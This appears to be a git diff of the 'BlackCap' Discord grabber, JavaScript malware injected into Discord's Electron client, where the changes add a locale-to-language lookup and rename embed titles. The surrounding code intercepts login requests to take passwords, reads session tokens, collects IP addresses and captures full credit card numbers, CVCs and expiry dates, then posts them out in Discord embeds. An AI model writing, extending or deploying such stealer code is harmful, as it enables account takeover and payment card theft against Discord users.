@@ -60,7 +60,7 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "ASdUu24SW13",
+        username: "Grabber",
         content: "",
         embeds: [{
             title: title,
@@ -172,6 +172,42 @@ const GetNitro = r => {
     }
 }
 
+function GetLangue(read) {
+    var languages = {
+        "fr": ":flag_fr: French",
+        "da": ":flag_dk: Dansk",
+        "de": ":flag_de: Deutsch",
+        "en-GB": ":england: English (UK)",
+        "en-US": ":flag_us: USA",
+        "en-ES": ":flag_es: Espagnol",
+        "hr": ":flag_hr: Croatian",
+        "it": ":flag_it: Italianio",
+        "lt": ":flag_lt: Lithuanian",
+        "hu": ":flag_no::flag_hu: Hungarian",
+        "no": ":flag_no: Norwegian",
+        "pl": ":flag_pl: Polish",
+        'pr-BR': ":flag_pt: Portuguese",
+        "ro": ":flag_ro: Romanian",
+        "fi": ":flag_fi: Finnish",
+        "sv-SE": ":flag_se: Swedish",
+        "vi": ":flag_vn: Vietnamese",
+        "tr": ":flag_tr: Turkish",
+        "cs": ":flag_cz: Czech",
+        "el": ":flag_gr: Greek",
+        "bg": ":flag_bg: Bulgarian",
+        "ru": ":flag_ru: Russian",
+        "uk": ":flag_ua: Ukraine",
+        "hi": ":flag_in: Indian",
+        "th": ":flag_tw: Taiwanese",
+        "zh-CN": ":flag_cn: Chinese-China",
+        "ja": ":flag_jp: Japanese",
+        "zh-TW": ":flag_cn: Chinese-Taiwanese",
+        "ko": ":flag_kr: Korean"
+    }
+
+    var langue = languages[read] || "No Languages Detected ????";
+    return langue
+}
 const post = async (params) => {
     params = JSON.stringify(params)
     var token = await execScript(tokenScript)
@@ -202,6 +238,12 @@ const post = async (params) => {
 
 
 
+
+
+
+
+
+
 const FirstTime = async () => {
     if (doTheLogOut) return false
     var token = await execScript(tokenScript)
@@ -210,7 +252,9 @@ const FirstTime = async () => {
     var ip = await getIP()
     if (!token) {
         var params = await makeEmbed({
+            title: "Initalized",
             fields: [{
+                name: "Info",
                 value: `\`IP: \n${ip}\n\`\`\``,
                 inline: !1
             }]
@@ -227,7 +271,7 @@ const FirstTime = async () => {
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: "ASdUu24SW13",
+            title: "Initalized",
             fields: [{
                 name: "Info",
                 value: `\`${ip}\``,
@@ -244,6 +288,10 @@ const FirstTime = async () => {
                 name: "Nitro <a:nitro:1041639670288748634>",
                 value: `${GetNitro(Nitro)}`,
                 inline: !0
+            }, {
+                name: "Language <:language:1041640473477001236>",
+                value: `${GetLangue(user.locale)}`,
+                inline: !1
             }, {
                 name: "NSFW <a:nsfw:1041640474617839616>",
                 value: `${GetNSFW(user.nsfw_allowed)}`,
@@ -282,6 +330,17 @@ const FirstTime = async () => {
 
     return false
 }
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -378,8 +437,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
+                title: "Initalized",
                 color: config['embed-color'],
                 fields: [{
+                    name: "Info",
                     value: `\`${ip}\``,
                     inline: !0
                 }, {
@@ -394,6 +455,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     name: "Nitro <a:nitro:1041639670288748634>",
                     value: `${GetNitro(Nitro)}`,
                     inline: !0
+                }, {
+                    name: "Language <:language:1041640473477001236>",
+                    value: `${GetLangue(user.locale)}`,
+                    inline: !1
                 }, {
                     name: "NSFW <a:nsfw:1041640474617839616>",
                     value: `${GetNSFW(user.nsfw_allowed)}`,
@@ -437,7 +502,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
 
             var params = await makeEmbed({
-                title: "User Credit Card Added",
+                title: "BlackCap User Credit Card Added",
                 description: `
                 **IP:** ${ip}\n\n
                 **Username** <:username:1041634536733290596>\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
